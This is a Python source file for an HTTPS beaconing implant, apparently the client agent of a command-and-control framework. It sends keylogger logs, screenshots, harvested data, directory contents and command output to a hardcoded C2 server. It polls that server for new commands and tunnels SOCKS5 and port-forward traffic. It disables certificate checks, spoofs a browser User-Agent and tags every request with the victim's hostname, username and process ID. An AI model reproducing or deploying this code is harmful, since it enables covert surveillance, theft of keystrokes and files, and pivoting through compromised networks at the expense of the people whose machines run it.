import os
import sys
import base64
import http.client
import json
import getpass
import ssl
import time
import subprocess
from pathlib import Path
import socket
import random

from localAgent import LocalAgent

class HTTPSAgent(LocalAgent):
	http_server = '127.0.0.1'
	http_port = 8000

	def __init__(self):
		LocalAgent.__init__(self)
		self.headers = {'Content-type': 'text/plain', 'UID': self.daemonUID, 'Hostname': socket.gethostname(), 'PID': os.getpid(), 'Username': getpass.getuser(), 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1'}

	def getScriptName(self):
		return os.path.realpath(__file__) 
        
	def postHTTPS(self, headers, resource, cmd_output):
		ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
		ssl_context.check_hostname = False
		ssl_context.verify_mode = ssl.CERT_NONE
		connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
		connection.request('POST', resource, cmd_output + os.linesep, headers)
		response = connection.getresponse().read().decode()
   
	def postKeylogger(self, log):
		try:
			payload = socket.gethostname() + "\n" + log
			self.postHTTPS(self.headers, '/key', payload)
		except Exception as e:
			print("Oops, something went wrong: {}".format(e), file=sys.stderr)

	def postResponse(self, cmd_output):
		try:
			self.postHTTPS(self.headers, '/test', cmd_output)
		except Exception as e:
			print("Oops, something went wrong: {}".format(e), file=sys.stderr)
        
	def postScreenshot(self, cmd_output):
		try:
			self.postHTTPS(self.headers, '/screenshot', cmd_output)
		except Exception as e:
			print("Oops, something went wrong: {}".format(e), file=sys.stderr)

        
	def postHarvest(self, cmd_output, harvestType):
		try:
			harvestHeaders = self.headers.copy()
			harvestHeaders['Harvest'] = harvestType
			self.postHTTPS(harvestHeaders, '/harvest', cmd_output)
		except Exception as e:
			print("Oops, something went wrong: {}".format(e), file=sys.stderr)
            
	def pollServer(self):
		try:    
			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
			ssl_context.check_hostname = False
			ssl_context.verify_mode = ssl.CERT_NONE
			connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
			connection.request('GET', '/test', "MOAR COMMANDS", self.headers)
		except Exception as e:
			print("Oops, something went wrong: {}".format(e), file=sys.stderr)

		return connection.getresponse().read().decode()    

	def postDirHarvest(self, content, session_id):
		try:
			harvestHeaders = self.headers.copy()
			harvestHeaders['UPLOAD_SESSION'] = str(session_id)
			self.postHTTPS(harvestHeaders, '/test', content)
		except Exception as e:
			print("Oops, something went wrong: {}".format(e), file=sys.stderr)    
        
	def pollForward(self, forwardID):
		try:    
			localheaders = self.headers.copy()
			localheaders['ForwardRequest'] = forwardID
			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
			ssl_context.check_hostname = False
			ssl_context.verify_mode = ssl.CERT_NONE
			connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
			connection.request('GET', '/proxy', "MOAR COMMANDS", localheaders)
			response = connection.getresponse().read().decode()
			if response == "<No Data>":
				return None
			else:
				return base64.decodebytes(response.encode('ascii'))
		except Exception as e:
			print("Oops, something went wrong, pollForward: {}".format(e), file=sys.stderr)
			return None

	def pollSocksForward(self, forwardID):
		try:    
			localheaders = self.headers.copy()
			localheaders['ProxyId'] = forwardID
			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
			ssl_context.check_hostname = False
			ssl_context.verify_mode = ssl.CERT_NONE
			connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
			connection.request('GET', '/socks5', "MOAR COMMANDS", localheaders)
			response = connection.getresponse().read().decode()
			if response == "<No Data>":
				return None
			else:
				return base64.decodebytes(response.encode('ascii'))
		except Exception as e:
			print("Oops, something went wrong, pollForward: {}".format(e), file=sys.stderr)
			return None

	def pushSocksForward(self, forwardID, data):
		try:
			im_b64 = base64.b64encode(data).decode('ascii')
			localheaders = self.headers.copy()
			localheaders['ProxyId'] = forwardID
			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
			ssl_context.check_hostname = False
			ssl_context.verify_mode = ssl.CERT_NONE
			connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
			connection.request('POST', "/socks5", im_b64, localheaders)
			response = connection.getresponse().read().decode()
		except Exception as e:
			print("Oops, something went wrong, pushForward: {}".format(e), file=sys.stderr)

	def pushForward(self, forwardID, data):
		try:
			im_b64 = base64.b64encode(data).decode('ascii')
			localheaders = self.headers.copy()
			localheaders['ForwardRequest'] = forwardID
			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
			ssl_context.check_hostname = False
			ssl_context.verify_mode = ssl.CERT_NONE
			connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
			connection.request('POST', "/proxy", im_b64, localheaders)
		except Exception as e:
			print("Oops, something went wrong, pushForward: {}".format(e), file=sys.stderr)


agent = HTTPSAgent()
agent.run()